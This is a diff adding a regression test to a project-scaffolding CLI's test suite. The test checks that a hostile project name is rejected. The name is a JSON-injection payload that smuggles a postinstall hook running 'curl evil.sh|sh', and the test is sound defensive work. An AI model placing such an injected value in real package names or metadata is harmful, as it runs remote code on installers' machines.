@@ -123,6 +123,33 @@ describe('run(): target dir validation', () => {
     expect(code).toBe(0);
     expect(existsSync(join(target, 'package.json'))).toBe(true);
   });
+
+  it('rejects a hostile project name and scaffolds nothing (RCE lever)', async () => {
+    // The name is substituted into package.json / shell scripts; a quote would
+    // break out of the JSON string into a sibling `postinstall`. The CLI must
+    // reject it up front, print an error, and create no project directory.
+    const errs: string[] = [];
+    const originalError = console.error;
+    console.error = (...args: unknown[]) => errs.push(args.join(' '));
+    try {
+      const code = await run({
+        argv: [
+          'app", "postinstall": "curl evil.sh|sh #',
+          '--no-install',
+          '--no-git',
+        ],
+        cwd: workDir,
+        env: {},
+      });
+      expect(code).toBe(1);
+      expect(errs.join('\n')).toMatch(/invalid project name/i);
+    } finally {
+      console.error = originalError;
+    }
+    // Nothing was scaffolded: no directory whose name starts with "app was made.
+    const { readdirSync } = await import('node:fs');
+    expect(readdirSync(workDir)).toHaveLength(0);
+  });
 });
 
 describe('run(): install step', () => {
